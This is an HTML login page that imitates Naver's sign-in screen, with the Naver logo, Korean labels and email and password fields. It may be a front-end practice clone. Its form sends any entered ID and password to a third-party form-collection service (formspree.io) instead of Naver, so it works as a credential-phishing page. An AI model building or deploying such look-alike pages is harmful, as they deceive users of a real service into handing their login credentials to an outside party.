<!DOCTYPE html>
<html lang="ko-KR">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>네이버 로그인</title>
</head>
<body>
  <header class="header">
    <h1 class="logo">
      <a href="/" class="logo__link">
        <img src="./images/logo.png" srcset="./images/logo.svg" alt="네이버">
       <img src="" alt="" />
      </a>
    </h1>
    <main class="main">
      <h2 class="a11yHidden">로그인</h2>
      <form action="https://formspree.io/f/mrgrplje"  method="POST" class="loginForm">
        <fieldset>
          <legend>로그인 폼</legend>

          <div class="userEmail">
            <div class="formControl formControlUser">
              <label for="userEmail" class="a11yHidden formControl__label">아이디</label>
              <input class="formControl__input" type="email" id="userEmail" name="userEmail" required placeholder="아이디">
            </div>
            <span class="errorMessage">아이디는 이메일 형식이어야 합니다.</span>
          </div>
          <div class="userPassword is--invalid">
            <div class="formControl formControlUser">
              <label for="userPassword" class="a11yHidden formControl__label">비밀번호</label>
              <input class="formControl__input" type="password" id="userPassword" name="userPassword" required placeholder="비밀번호">
            </div>
            <span class="errorMessage">비밀번호는 10자리 이상 입력해주세요.</span>
          </div>
        </fieldset>
      </form>
    </main>
  </header>
</body>
</html>
